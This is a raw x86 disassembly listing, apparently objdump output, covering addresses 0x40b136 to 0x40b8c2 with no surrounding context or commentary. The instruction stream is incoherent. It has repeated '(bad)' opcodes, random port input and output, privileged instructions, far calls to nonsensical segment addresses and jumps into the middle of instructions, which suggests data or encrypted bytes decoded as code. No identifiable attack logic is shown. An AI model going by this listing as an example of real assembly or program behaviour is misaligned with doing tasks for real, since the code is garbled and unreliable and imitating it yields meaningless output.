  40b136:	cmp    eax,0xedcdc1e0
  40b13b:	ret    
  40b13c:	cmp    eax,0x4064ff79
  40b141:	dec    ebx
  40b142:	in     al,dx
  40b143:	mov    ch,0x64
  40b145:	push   ds
  40b146:	mov    bh,0xd6
  40b148:	adc    edi,ebp
  40b14a:	imul   ecx,DWORD PTR [ecx+ebp*2+0x77209812],0xbae1c84b
  40b155:	dec    ecx
  40b156:	rcr    dh,0x95
  40b159:	outs   dx,BYTE PTR ds:[esi]
  40b15a:	mov    ebp,0x421eccf6
  40b15f:	or     eax,0xa536aea9
  40b164:	jge    0x40b18d
  40b166:	xor    dh,ch
  40b168:	push   esi
  40b169:	icebp  
  40b16a:	lock push eax
  40b16c:	jge    0x40b180
  40b16e:	sub    eax,0x249ccfa2
  40b173:	test   eax,0xbb7702d
  40b178:	and    DWORD PTR [esi-0x43],ecx
  40b17b:	mul    BYTE PTR [eax-0x4a5abe4f]
  40b181:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b182:	pmulhuw mm7,QWORD PTR [eax-0x4d]
  40b186:	sbb    DWORD PTR [ecx+0x3b78e773],edi
  40b18c:	sub    eax,0x72605ce0
  40b191:	or     BYTE PTR [ecx-0x6b],cl
  40b194:	and    al,BYTE PTR [edx+0x2f9d8cf2]
  40b19a:	je     0x40b199
  40b19c:	stos   DWORD PTR es:[edi],eax
  40b19d:	ins    BYTE PTR es:[edi],dx
  40b19e:	out    dx,eax
  40b19f:	retf   
  40b1a0:	sbb    edx,DWORD PTR [edx+0x69]
  40b1a3:	ret    0xe8a8
  40b1a6:	out    dx,al
  40b1a7:	cdq    
  40b1a8:	in     eax,dx
  40b1a9:	mov    esp,0x502d4d05
  40b1ae:	jmp    0x40b1ab
  40b1b0:	xor    al,0x45
  40b1b2:	jbe    0x40b1b7
  40b1b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b1b5:	out    0x8c,eax
  40b1b7:	dec    BYTE PTR [edi-0x67]
  40b1ba:	pushf  
  40b1bb:	or     BYTE PTR [ecx+0x25],bh
  40b1be:	jbe    0x40b226
  40b1c0:	(bad)  
  40b1c1:	(bad)
  40b1c5:	jmp    0x40b213
  40b1c7:	xlat   BYTE PTR ds:[ebx]
  40b1c8:	sub    al,0x42
  40b1ca:	pop    eax
  40b1cb:	inc    ebx
  40b1cc:	and    eax,0xf4c35801
  40b1d1:	imul   esi,DWORD PTR [edx-0x7],0x7c
  40b1d5:	iret   
  40b1d6:	jecxz  0x40b19e
  40b1d8:	pcmpgtw mm6,mm3
  40b1db:	dec    ecx
  40b1dc:	push   ds
  40b1dd:	sar    DWORD PTR [eax-0x2a7901b5],0x8c
  40b1e4:	imul   ebx,DWORD PTR [edi],0xffffffe9
  40b1e7:	inc    ebx
  40b1e8:	ins    BYTE PTR es:[edi],dx
  40b1e9:	lea    edi,[eax-0x5f12ea09]
  40b1ef:	pop    edx
  40b1f0:	cmp    esp,DWORD PTR cs:[edx]
  40b1f3:	mov    al,0xd7
  40b1f5:	adc    eax,0x2b4efcff
  40b1fa:	xchg   edi,eax
  40b1fb:	sub    al,0x75
  40b1fd:	and    ebx,esp
  40b1ff:	int    0x21
  40b201:	ret    0x777c
  40b204:	(bad)  
  40b205:	dec    edx
  40b206:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b207:	adc    ecx,eax
  40b209:	inc    eax
  40b20a:	xchg   ebx,eax
  40b20b:	ret    0xad89
  40b20e:	mov    ch,0x95
  40b210:	jns    0x40b19b
  40b212:	in     eax,0xc2
  40b214:	mov    eax,0x5e6221f8
  40b219:	fiadd  DWORD PTR [ecx+0x41297ae7]
  40b21f:	xchg   ebx,eax
  40b220:	call   0x5092633c
  40b225:	mov    ds:0x49533fda,al
  40b22a:	jo     0x40b200
  40b22c:	ret    
  40b22d:	mov    ah,BYTE PTR [esp+ebx*1]
  40b230:	lahf   
  40b231:	pop    es
  40b232:	das    
  40b233:	scas   al,BYTE PTR es:[edi]
  40b234:	sti    
  40b235:	outs   dx,BYTE PTR ds:[esi]
  40b236:	aad    0x59
  40b238:	es int 0x99
  40b23b:	aaa    
  40b23c:	lea    edx,[edi]
  40b23e:	mov    esi,0x7e9e9ab5
  40b243:	adc    dh,bh
  40b245:	mov    eax,0xd2ac2a2
  40b24a:	loope  0x40b276
  40b24c:	clc    
  40b24d:	fcomp  QWORD PTR [ebp-0x13f7c15b]
  40b253:	aad    0xbf
  40b255:	stos   DWORD PTR es:[edi],eax
  40b256:	mov    bl,0x10
  40b258:	jne    0x40b229
  40b25a:	loop   0x40b228
  40b25c:	mov    cl,0x58
  40b25e:	push   0xb1618cbf
  40b263:	add    DWORD PTR [edi],edx
  40b265:	add    ecx,ebp
  40b267:	ja     0x40b1f0
  40b269:	sub    bl,ch
  40b26b:	mov    eax,ds:0x84510f1
  40b270:	aam    0x9
  40b272:	jbe    0x40b1f7
  40b274:	jmp    0xf8b8:0xe6e20321
  40b27b:	mov    al,0x6b
  40b27d:	and    dl,bh
  40b27f:	data16 mov ds:0xaea7abc6,al
  40b285:	adc    esp,esp
  40b287:	retf   0x876d
  40b28a:	cmp    edi,ebp
  40b28c:	lock mov ?,WORD PTR [ebx+0xb]
  40b290:	mov    ebx,0xb5b7ec81
  40b295:	jb     0x40b224
  40b297:	out    dx,eax
  40b298:	dec    eax
  40b299:	(bad)  
  40b29a:	popa   
  40b29b:	or     edx,esp
  40b29d:	stc    
  40b29e:	popf   
  40b29f:	lock inc ebx
  40b2a1:	fucomip st,st(3)
  40b2a3:	shl    BYTE PTR [edx+0x9f1fb4c],cl
  40b2a9:	loopne 0x40b2b8
  40b2ab:	inc    esi
  40b2ac:	inc    eax
  40b2ad:	push   esi
  40b2ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b2af:	out    dx,al
  40b2b0:	lods   eax,DWORD PTR ds:[esi]
  40b2b1:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  40b2b3:	lock mov edx,0x587e7626
  40b2b9:	repz mov edx,0x143e08e0
  40b2bf:	dec    esp
  40b2c0:	sti    
  40b2c1:	add    al,0xb6
  40b2c3:	test   DWORD PTR cs:0xdb7558b,0xe1f97fc6
  40b2ce:	adc    BYTE PTR [ecx+0x3f],bh
  40b2d1:	ins    DWORD PTR es:[edi],dx
  40b2d2:	xor    DWORD PTR [esi+0x4797f1c1],eax
  40b2d8:	dec    esp
  40b2d9:	sub    edi,ecx
  40b2db:	pop    ds
  40b2dc:	aas    
  40b2dd:	push   ebp
  40b2de:	jmp    0x40b342
  40b2e0:	and    DWORD PTR [eax],esp
  40b2e2:	int3   
  40b2e3:	stc    
  40b2e4:	inc    ecx
  40b2e5:	out    0x47,al
  40b2e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b2e8:	inc    eax
  40b2e9:	xchg   ecx,eax
  40b2ea:	or     DWORD PTR [esp+ebp*2+0x29a64190],0xd9fe5b16
  40b2f5:	pusha  
  40b2f6:	jl     0x40b301
  40b2f8:	out    dx,al
  40b2f9:	and    DWORD PTR [edx],esi
  40b2fb:	mov    al,0x99
  40b2fd:	out    dx,al
  40b2fe:	sub    BYTE PTR [edx],dl
  40b300:	pop    ds
  40b301:	lahf   
  40b302:	mov    ebx,0xd2f05c8e
  40b307:	cmc    
  40b308:	xchg   ebp,eax
  40b309:	fcomp  DWORD PTR [ebx+eax*2]
  40b30c:	das    
  40b30d:	or     DWORD PTR [ebx+0x3058be7],ebx
  40b313:	fdivr  QWORD PTR [esi-0x48]
  40b316:	repz fs out dx,al
  40b319:	out    dx,eax
  40b31a:	mov    ah,ch
  40b31c:	outs   dx,DWORD PTR ds:[esi]
  40b31d:	inc    eax
  40b31e:	ret    
  40b31f:	loop   0x40b2a1
  40b321:	pusha  
  40b322:	cmp    esi,DWORD PTR [ebp-0x29]
  40b325:	pop    esi
  40b326:	xchg   esi,eax
  40b327:	dec    esi
  40b328:	mov    dl,BYTE PTR ss:[edx+ecx*8-0x80]
  40b32d:	sbb    al,0x73
  40b32f:	add    ch,BYTE PTR [ecx-0x1f7471a9]
  40b335:	(bad)  
  40b336:	mov    ds:0x65cf1f1e,eax
  40b33b:	dec    esp
  40b33c:	scas   eax,DWORD PTR es:[edi]
  40b33d:	pop    ds
  40b33e:	call   0x8658403f
  40b343:	push   ebx
  40b344:	fnsave ss:[eax+edx*2]
  40b348:	daa    
  40b349:	loopne 0x40b3ba
  40b34b:	and    BYTE PTR [ebp-0x55],bh
  40b34e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b34f:	xchg   edi,eax
  40b350:	push   esi
  40b351:	cs jno 0x40b351
  40b354:	test   eax,0x774f8d4e
  40b359:	iret   
  40b35a:	ret    
  40b35b:	push   ebp
  40b35c:	jo     0x40b343
  40b35e:	mov    ds:0x58e90b82,eax
  40b363:	aad    0xff
  40b365:	fld    QWORD PTR [ecx+0x41]
  40b368:	loope  0x40b2ff
  40b36a:	xor    BYTE PTR [eax+eax*8+0x36],bh
  40b36e:	xchg   esp,eax
  40b36f:	and    BYTE PTR [eax-0x53744ae],bl
  40b375:	dec    ebx
  40b376:	loop   0x40b34d
  40b378:	adc    edi,DWORD PTR [eax-0x42193b34]
  40b37e:	inc    ebx
  40b37f:	lods   al,BYTE PTR ds:[esi]
  40b380:	sub    ah,cl
  40b382:	add    ebp,ebp
  40b384:	mov    WORD PTR [ebx+edi*4],ds
  40b387:	xchg   ch,al
  40b389:	int    0x68
  40b38b:	add    eax,0x424f4502
  40b390:	fmul   DWORD PTR [eax+0x367f5aed]
  40b396:	es div eax
  40b399:	ror    BYTE PTR [eax+0x265f3e0e],0x8
  40b3a0:	stos   BYTE PTR es:[edi],al
  40b3a1:	inc    eax
  40b3a2:	arpl   WORD PTR [esi],cx
  40b3a4:	in     al,dx
  40b3a5:	push   edi
  40b3a6:	clc    
  40b3a7:	hlt    
  40b3a8:	aaa    
  40b3a9:	adc    al,0x65
  40b3ab:	cmp    eax,DWORD PTR [eax-0x17eede57]
  40b3b1:	into   
  40b3b2:	xchg   ebp,eax
  40b3b3:	fs das 
  40b3b5:	adc    edx,DWORD PTR [ebx-0x3d]
  40b3b8:	stos   BYTE PTR es:[edi],al
  40b3b9:	inc    esp
  40b3ba:	mov    esp,eax
  40b3bc:	out    0x4c,al
  40b3be:	add    DWORD PTR [eax-0xb6758a2],ecx
  40b3c4:	fmul   DWORD PTR [edx+0x26ab9dc8]
  40b3ca:	xchg   ebx,eax
  40b3cb:	out    0xf7,eax
  40b3cd:	loope  0x40b42b
  40b3cf:	(bad)  
  40b3d1:	jl     0x40b38d
  40b3d3:	mov    esp,0x44174fdf
  40b3d8:	scas   eax,DWORD PTR es:[edi]
  40b3d9:	mov    eax,ds:0xa2bb11e3
  40b3de:	push   edi
  40b3df:	jmp    0x6f02:0xe7c7fb43
  40b3e6:	jle    0x40b3d3
  40b3e8:	inc    ecx
  40b3e9:	mov    cl,bl
  40b3eb:	pop    ebp
  40b3ec:	or     al,0x42
  40b3ee:	sbb    esi,eax
  40b3f0:	pop    es
  40b3f1:	ror    DWORD PTR [ebp-0x6d],1
  40b3f4:	cdq    
  40b3f5:	mov    dh,0xa7
  40b3f7:	aaa    
  40b3f8:	push   esi
  40b3f9:	cmp    BYTE PTR [esi-0x34d8b416],cl
  40b3ff:	(bad)  
  40b400:	int    0xa6
  40b402:	mov    ch,0x50
  40b404:	gs in  al,0xfc
  40b407:	dec    edx
  40b408:	mov    dl,0xc6
  40b40a:	mov    ebp,0xf65861a1
  40b40f:	jl     0x40b427
  40b411:	popf   
  40b412:	sbb    dl,ah
  40b414:	adc    eax,0x9c53488c
  40b419:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b41a:	hlt    
  40b41b:	sub    BYTE PTR [edx+0x4f9a7b71],bl
  40b421:	jno    0x4dedef68
  40b427:	push   ss
  40b428:	or     ah,BYTE PTR ds:0x86ff31b1
  40b42e:	icebp  
  40b42f:	(bad)  
  40b430:	scas   eax,DWORD PTR es:[edi]
  40b431:	test   eax,0x1bcdead7
  40b436:	in     al,dx
  40b437:	jp     0x40b46d
  40b439:	pop    ecx
  40b43a:	mov    dh,0x24
  40b43c:	in     al,0xc0
  40b43e:	inc    edi
  40b43f:	aam    0xeb
  40b441:	fst    QWORD PTR [edx-0x5c9531a2]
  40b447:	mov    dl,0xb6
  40b449:	or     ebp,DWORD PTR [ecx+0x34d8c8c7]
  40b44f:	cmc    
  40b450:	dec    ecx
  40b451:	ja     0x40b442
  40b453:	pop    esp
  40b454:	(bad)  
  40b455:	xchg   esp,eax
  40b456:	mov    ah,0x48
  40b458:	pop    edx
  40b459:	(bad)  
  40b45b:	push   ds
  40b45c:	push   0x4
  40b45e:	jae    0x40b3ed
  40b460:	sbb    eax,0xbc54228b
  40b465:	xor    DWORD PTR [eax],ecx
  40b467:	jp     0x40b4b1
  40b469:	or     cl,ah
  40b46b:	add    ecx,DWORD PTR [ecx+0xacc63b1]
  40b471:	mov    ch,0x8f
  40b473:	daa    
  40b474:	cld    
  40b475:	mov    cl,0x88
  40b477:	enter  0xdd3b,0xe9
  40b47b:	stos   BYTE PTR es:[edi],al
  40b47c:	test   DWORD PTR [ebx-0x7],esi
  40b47f:	or     esp,DWORD PTR [esi+0x19]
  40b482:	cdq    
  40b483:	int    0xbe
  40b485:	mov    bl,0x9a
  40b487:	loope  0x40b4e3
  40b489:	inc    eax
  40b48a:	sub    DWORD PTR [ebx+0x72],esi
  40b48d:	pop    ecx
  40b48e:	jecxz  0x40b50a
  40b490:	and    dh,BYTE PTR [eax-0x3c]
  40b493:	sti    
  40b494:	je     0x40b50b
  40b496:	push   esp
  40b497:	adc    eax,0xd16f743f
  40b49c:	fild   DWORD PTR [edi-0x3e4ffc13]
  40b4a2:	xchg   ebx,eax
  40b4a3:	push   0xffffff95
  40b4a5:	sbb    eax,0x97c0a347
  40b4aa:	push   ebx
  40b4ab:	add    eax,0x7bbe0032
  40b4b0:	sub    edx,DWORD PTR [ebx-0x4ce8485a]
  40b4b6:	adc    eax,0xb8864027
  40b4bb:	mov    ebx,0xb567d2b2
  40b4c0:	dec    edx
  40b4c2:	jo     0x40b488
  40b4c4:	icebp  
  40b4c5:	or     al,0xa4
  40b4c7:	test   al,0x57
  40b4c9:	or     edi,DWORD PTR [ecx]
  40b4cb:	imul   ebx,DWORD PTR [eax+0x50ec6591],0xf2215286
  40b4d5:	add    al,0x49
  40b4d7:	out    0x99,al
  40b4d9:	sbb    BYTE PTR [edx+0x62],bh
  40b4dc:	mov    ebx,0x596e167d
  40b4e1:	test   eax,0x86adab1e
  40b4e6:	fcmovnbe st,st(6)
  40b4e8:	fistp  DWORD PTR [ebx-0x6b]
  40b4eb:	mov    edx,0xa378a64
  40b4f0:	cmp    DWORD PTR [ecx],edi
  40b4f2:	mov    bh,0x31
  40b4f4:	adc    cl,BYTE PTR [ecx]
  40b4f6:	call   0xad8027f6
  40b4fb:	sub    DWORD PTR [eax+0x5db91b63],esp
  40b501:	loop   0x40b486
  40b503:	pop    edx
  40b504:	cmp    al,0x41
  40b506:	or     al,0x67
  40b508:	and    al,0xc
  40b50a:	inc    edi
  40b50b:	sbb    DWORD PTR [ebp-0x6c26e5a4],ebx
  40b511:	nop
  40b512:	cmp    BYTE PTR [edx+0xb],ch
  40b515:	mov    esp,0xa70d2b37
  40b51a:	cmp    al,0x71
  40b51c:	or     dh,BYTE PTR [eax-0x163da50c]
  40b522:	ret    
  40b523:	test   eax,0x7277cced
  40b528:	fdiv   DWORD PTR [ebx+ebp*2-0x5b]
  40b52c:	iret   
  40b52d:	inc    ebx
  40b52e:	test   BYTE PTR [ebp-0x6a],ah
  40b531:	ret    0xf340
  40b534:	and    eax,0x34a0f7d9
  40b539:	fld    QWORD PTR [esi+0x2c]
  40b53c:	sbb    eax,0x97578fa4
  40b541:	in     eax,dx
  40b542:	mov    bl,0xd9
  40b544:	or     eax,0x136db8c7
  40b549:	retf   
  40b54a:	shr    BYTE PTR [esi*8-0x1f2a7c68],1
  40b551:	push   es
  40b552:	add    BYTE PTR [eax+0x5f167f41],dl
  40b558:	add    BYTE PTR [edx+0x15],bl
  40b55b:	or     ch,BYTE PTR [ecx-0x2]
  40b55e:	int    0x57
  40b560:	mov    edx,0xe8fb4e3a
  40b565:	mov    ah,0xbd
  40b567:	inc    esi
  40b568:	lahf   
  40b569:	pusha  
  40b56a:	mov    ebp,0x6986dbe7
  40b56f:	jl     0x40b5a2
  40b571:	sub    ecx,DWORD PTR [edx+ebp*4-0x2e]
  40b575:	xor    DWORD PTR [edi-0x1b2264bd],ebp
  40b57b:	enter  0xb2d3,0xee
  40b57f:	push   cs
  40b580:	push   eax
  40b581:	aaa    
  40b582:	loop   0x40b560
  40b584:	sbb    DWORD PTR [eax+edx*1],edi
  40b587:	add    al,0xa1
  40b589:	cmp    esi,DWORD PTR [eax+eiz*2+0x6909f0e]
  40b590:	aad    0x18
  40b592:	les    ebx,FWORD PTR [edx+0x20]
  40b595:	sbb    edi,DWORD PTR [edi+ebp*1-0x80]
  40b599:	xlat   BYTE PTR ds:[ebx]
  40b59a:	jle    0x40b5a0
  40b59c:	or     DWORD PTR [eax],0x9ca54300
  40b5a2:	in     al,0xec
  40b5a4:	add    DWORD PTR [ecx-0x3486b49f],edi
  40b5aa:	xchg   ebp,eax
  40b5ab:	xor    al,0x69
  40b5ad:	and    ebp,ebx
  40b5af:	push   cs
  40b5b0:	or     BYTE PTR ds:0x98c9111c,dl
  40b5b6:	sub    eax,0xa30ab1ae
  40b5bb:	mov    bl,0xb7
  40b5bd:	jge    0x40b5dc
  40b5bf:	bnd jno 0x40b5fc
  40b5c2:	xor    BYTE PTR [ebx-0x1398156e],al
  40b5c8:	fsub   QWORD PTR [edx-0x2c]
  40b5cb:	cmp    al,0x40
  40b5cd:	mov    eax,ds:0xb29a8a58
  40b5d2:	out    dx,al
  40b5d3:	jl     0x40b5ac
  40b5d5:	push   edx
  40b5d6:	push   0xffffffa3
  40b5d8:	adc    cl,BYTE PTR [edi+0x12a358c8]
  40b5de:	loop   0x40b5f0
  40b5e0:	jecxz  0x40b621
  40b5e2:	lock mov ch,BYTE PTR [ecx+0x5a]
  40b5e6:	xor    DWORD PTR [ebp+0x5b],0x65cf9f62
  40b5ed:	xor    DWORD PTR [ecx+0x3c],ecx
  40b5f0:	xchg   ebp,eax
  40b5f1:	sti    
  40b5f2:	add    cl,BYTE PTR [eax+0x20]
  40b5f5:	push   eax
  40b5f6:	pop    ds
  40b5f7:	shl    BYTE PTR [eax-0xb2c722e],1
  40b5fd:	sub    eax,0x9f3b5957
  40b602:	jne    0x40b610
  40b604:	or     eax,0x6babd91
  40b609:	jl     0x40b678
  40b60b:	mov    edi,0x6ac03fc1
  40b610:	fwait
  40b611:	repz add al,0x37
  40b614:	aam    0x94
  40b616:	aad    0xc9
  40b618:	pop    edx
  40b619:	ret    
  40b61a:	dec    ebp
  40b61b:	pop    es
  40b61c:	xor    cl,cl
  40b61e:	(bad)  
  40b61f:	test   BYTE PTR [esi],al
  40b621:	test   al,0x96
  40b623:	ins    BYTE PTR es:[edi],dx
  40b624:	sbb    ebp,esp
  40b626:	fiadd  DWORD PTR [eax+0x2e]
  40b629:	xchg   esi,eax
  40b62a:	add    BYTE PTR [eax-0x95c5784],ah
  40b630:	fcmovb st,st(2)
  40b632:	inc    ebp
  40b633:	push   edi
  40b634:	gs imul ebx,edi,0xeedb9c4c
  40b63b:	out    dx,al
  40b63c:	inc    eax
  40b63d:	test   al,0x18
  40b63f:	jp     0x40b5d1
  40b641:	sub    dl,ch
  40b643:	loope  0x40b6a6
  40b645:	call   FWORD PTR ds:0x34416fd3
  40b64b:	aad    0x8f
  40b64d:	or     al,0xe8
  40b64f:	mov    ds:0x6b34845a,al
  40b654:	mov    edi,0xdfe52f22
  40b659:	dec    edi
  40b65a:	in     eax,dx
  40b65b:	fldenv [edx+0x7896302]
  40b661:	sahf   
  40b662:	cli    
  40b663:	add    BYTE PTR [ebx+0x408b486e],0x67
  40b66a:	mov    WORD PTR [eax],ds
  40b66c:	aad    0xa9
  40b66e:	adc    ecx,DWORD PTR [ebx+0x1bf51fe5]
  40b674:	mov    dl,0x5c
  40b676:	mov    edx,0xac8cc155
  40b67b:	ficomp DWORD PTR [eax]
  40b67d:	mov    cl,0x64
  40b67f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b680:	push   0xe956c4b8
  40b685:	repnz (bad) 
  40b687:	mov    esi,0x23079d50
  40b68c:	in     eax,dx
  40b68d:	and    eax,0xa15ba8ff
  40b692:	mov    dh,0xd
  40b694:	dec    esi
  40b695:	(bad)  
  40b696:	imul   ebp
  40b698:	(bad)  
  40b699:	es inc ebx
  40b69b:	clc    
  40b69c:	imul   dl
  40b69e:	lock std 
  40b6a0:	mov    bh,0xb9
  40b6a2:	adc    eax,0x2b0386a1
  40b6a7:	fmulp  st(2),st
  40b6a9:	and    eax,0x1b2dd6c2
  40b6ae:	sbb    DWORD PTR [ebp+0x45],ecx
  40b6b1:	neg    BYTE PTR [edx-0x14b4220b]
  40b6b7:	jecxz  0x40b63d
  40b6b9:	adc    BYTE PTR [esi+0x1d],bl
  40b6bc:	sbb    BYTE PTR [ebx],bl
  40b6be:	not    BYTE PTR [edi]
  40b6c0:	mov    edi,0x2effe54d
  40b6c5:	adc    eax,0x7e55d97f
  40b6ca:	cs push ds
  40b6cc:	ficomp WORD PTR [ebx]
  40b6ce:	mov    bl,0x7
  40b6d0:	repz not DWORD PTR [edi+0x71]
  40b6d4:	mov    WORD PTR [ecx],cs
  40b6d6:	(bad)  
  40b6d7:	lea    esp,[edi+0x7733af53]
  40b6dd:	call   0xdc59ae08
  40b6e2:	scas   eax,DWORD PTR es:[edi]
  40b6e3:	cmp    DWORD PTR [ecx-0x119978ec],ebp
  40b6e9:	pop    edi
  40b6ea:	add    BYTE PTR [esi+0x4c03d297],ah
  40b6f0:	dec    eax
  40b6f1:	xor    dh,dl
  40b6f3:	pop    es
  40b6f4:	je     0x40b679
  40b6f6:	inc    eax
  40b6f7:	mov    bh,0xfc
  40b6f9:	scas   al,BYTE PTR es:[edi]
  40b6fa:	sub    BYTE PTR [esi-0x74],ah
  40b6fd:	xlat   BYTE PTR ds:[ebx]
  40b6fe:	mov    BYTE PTR [ebp-0x3],dl
  40b701:	(bad)  
  40b702:	sbb    edx,esp
  40b704:	and    ch,bl
  40b706:	dec    esp
  40b707:	pop    ebx
  40b708:	mov    bl,BYTE PTR [edx-0x3b6f7bdd]
  40b70e:	dec    edi
  40b70f:	imul   ebx,DWORD PTR [ebp+esi*4+0x4b],0xc40ae43b
  40b717:	or     bl,BYTE PTR [ebp-0x3ecf585d]
  40b71d:	sti    
  40b71e:	mov    al,0xfc
  40b720:	jne    0x40b6ef
  40b722:	or     ch,BYTE PTR [eax]
  40b724:	or     al,0xcd
  40b726:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b727:	retf   0xdcbb
  40b72a:	mov    edi,0xf3266212
  40b72f:	popf   
  40b730:	inc    eax
  40b731:	into   
  40b732:	fmul   QWORD PTR [edi]
  40b734:	mov    ecx,0x7ec5fb6e
  40b739:	pop    eax
  40b73a:	mov    dh,0xf6
  40b73c:	fidivr DWORD PTR [edx-0x15abf75f]
  40b742:	frstor [edx]
  40b744:	sub    eax,0xc618dc4c
  40b749:	inc    edi
  40b74a:	retf   
  40b74b:	adc    edx,DWORD PTR [ecx+edx*1+0x1297ec42]
  40b752:	inc    edx
  40b753:	sar    ecx,0x77
  40b756:	aad    0x1
  40b758:	sbb    al,0xc6
  40b75a:	inc    edx
  40b75b:	lahf   
  40b75c:	cmc    
  40b75d:	or     ecx,DWORD PTR [esi-0x7c]
  40b760:	sbb    BYTE PTR [edi],al
  40b762:	xor    BYTE PTR [esi*1+0x780b25ba],0x1a
  40b76a:	dec    eax
  40b76b:	xchg   ebp,eax
  40b76c:	(bad)  
  40b76d:	hlt    
  40b76e:	pop    ss
  40b76f:	or     eax,0xc1366eab
  40b774:	cld    
  40b775:	outs   dx,BYTE PTR ds:[esi]
  40b776:	pop    ss
  40b777:	pop    esp
  40b778:	xor    ecx,ecx
  40b77a:	sahf   
  40b77b:	pop    edi
  40b77c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b77d:	fsubr  st,st(5)
  40b77f:	mov    ds:0x9cbe813f,eax
  40b784:	daa    
  40b785:	cwde   
  40b786:	sbb    al,0xfb
  40b788:	jmp    DWORD PTR [ebx+0x41]
  40b78b:	and    al,0x26
  40b78d:	mov    ebp,0xf5f5dd6d
  40b792:	jnp    0x40b772
  40b794:	jo     0x40b7aa
  40b796:	adc    BYTE PTR [ecx+0x6f673f8d],bh
  40b79c:	cli    
  40b79d:	push   eax
  40b79e:	push   ecx
  40b79f:	rcl    edx,cl
  40b7a1:	fcomp  QWORD PTR [edi-0x19]
  40b7a4:	sub    dl,bl
  40b7a6:	and    bh,BYTE PTR [edi]
  40b7a8:	cmp    dl,cl
  40b7aa:	test   edi,esp
  40b7ac:	or     eax,0x4b6a2022
  40b7b1:	sub    bl,BYTE PTR [esi]
  40b7b3:	popa   
  40b7b4:	push   ss
  40b7b5:	xchg   edi,eax
  40b7b6:	xchg   DWORD PTR [eax-0xe],edx
  40b7b9:	lods   al,BYTE PTR ds:[esi]
  40b7ba:	pop    esi
  40b7bb:	xchg   edx,eax
  40b7bc:	fdiv   QWORD PTR [edx+0x2f]
  40b7bf:	out    0x2c,eax
  40b7c1:	mov    WORD PTR [eax+eax*2],?
  40b7c4:	xor    al,BYTE PTR [edi]
  40b7c6:	mov    ah,0x39
  40b7c8:	mov    cl,0x43
  40b7ca:	leave  
  40b7cb:	test   eax,0xf3cd80b9
  40b7d0:	les    esi,FWORD PTR [ebx]
  40b7d2:	mov    esi,DWORD PTR [esi-0x314d8bba]
  40b7d8:	in     eax,0xbf
  40b7da:	int3   
  40b7db:	sub    ebx,ebx
  40b7dd:	push   ecx
  40b7de:	inc    esi
  40b7df:	fldcw  WORD PTR [eax]
  40b7e1:	data16 cmps BYTE PTR ss:[esi],BYTE PTR es:[edi]
  40b7e4:	ss (bad) 
  40b7e6:	popf   
  40b7e7:	(bad)  
  40b7e9:	add    cl,BYTE PTR ds:0x30e0a5b7
  40b7ef:	jmp    0x40b7b1
  40b7f1:	out    dx,eax
  40b7f2:	and    esp,esi
  40b7f4:	push   es
  40b7f5:	push   cs
  40b7f6:	sub    ecx,eax
  40b7f8:	stos   BYTE PTR es:[edi],al
  40b7f9:	sub    ecx,ecx
  40b7fb:	mov    ds,WORD PTR [ecx]
  40b7fd:	iret   
  40b7fe:	xchg   si,ax
  40b800:	mov    bh,BYTE PTR [ebx-0x606bb75b]
  40b806:	push   eax
  40b807:	push   esp
  40b808:	(bad)  
  40b809:	mov    al,ds:0xd8059e45
  40b80e:	dec    ebp
  40b80f:	(bad)  
  40b810:	mov    ah,0x6e
  40b812:	out    0xa9,al
  40b814:	adc    BYTE PTR [edx],dl
  40b816:	ficomp WORD PTR [ebx+0x1a]
  40b819:	sub    ax,0xa823
  40b81d:	dec    esi
  40b81e:	aas    
  40b81f:	dec    edx
  40b820:	(bad)  
  40b821:	data16 or al,0x25
  40b824:	iret   
  40b825:	or     al,0x93
  40b827:	xchg   esp,eax
  40b828:	cmp    esi,eax
  40b82a:	cmp    al,0x4e
  40b82c:	ins    DWORD PTR es:[edi],dx
  40b82d:	repz shl ebx,1
  40b830:	push   0x47e43c3a
  40b835:	fucomp st(1)
  40b837:	push   edx
  40b838:	mov    dl,0xcb
  40b83a:	call   0x291:0x2274f288
  40b841:	adc    BYTE PTR [ebx-0x32],dh
  40b844:	push   edi
  40b845:	nop
  40b846:	lods   eax,DWORD PTR ds:[esi]
  40b847:	mov    bl,0x22
  40b849:	aaa    
  40b84a:	dec    eax
  40b84b:	(bad)  
  40b84c:	outs   dx,BYTE PTR ds:[esi]
  40b84d:	push   ebx
  40b84e:	sbb    dl,bl
  40b850:	xchg   BYTE PTR [ebp+0x2c1e36b8],cl
  40b856:	cwde   
  40b857:	sti    
  40b858:	jle    0x40b809
  40b85a:	int    0x5b
  40b85c:	shr    dl,0x8c
  40b85f:	aaa    
  40b860:	rcr    BYTE PTR [ebp-0x35256349],0x71
  40b867:	je     0x40b846
  40b869:	add    eax,edx
  40b86b:	repz dec ebp
  40b86d:	inc    edi
  40b86e:	ret    
  40b86f:	aad    0x7d
  40b871:	cld    
  40b872:	mov    bl,0x99
  40b874:	rol    BYTE PTR [eax],0xd2
  40b877:	dec    DWORD PTR [ebx+0x3a20128d]
  40b87d:	pop    eax
  40b87e:	jge    0x40b853
  40b880:	xor    BYTE PTR ds:0xa97b72c0,0xdb
  40b887:	sti    
  40b888:	push   eax
  40b889:	cmp    DWORD PTR [edi],esi
  40b88b:	pop    ecx
  40b88c:	push   ds
  40b88d:	call   0xa02f:0x1ec09aca
  40b894:	call   0x4b60:0xf51c0252
  40b89b:	dec    ebx
  40b89c:	test   DWORD PTR [ebx+0x1b0251d3],esi
  40b8a2:	scas   eax,DWORD PTR es:[edi]
  40b8a3:	mov    edx,gs
  40b8a5:	xchg   edi,eax
  40b8a6:	xchg   ebx,eax
  40b8a7:	mov    ch,0x7e
  40b8a9:	cmc    
  40b8aa:	cmc    
  40b8ab:	(bad)  
  40b8ac:	jle    0x40b887
  40b8ae:	pop    edx
  40b8af:	fcom   DWORD PTR [ebp-0x54]
  40b8b2:	mov    edi,0xee4947df
  40b8b7:	sbb    eax,0x9f8a636d
  40b8bc:	or     DWORD PTR [ebp-0x45cfec71],edx
  40b8c2:	mov    esp,0xfa5c070b
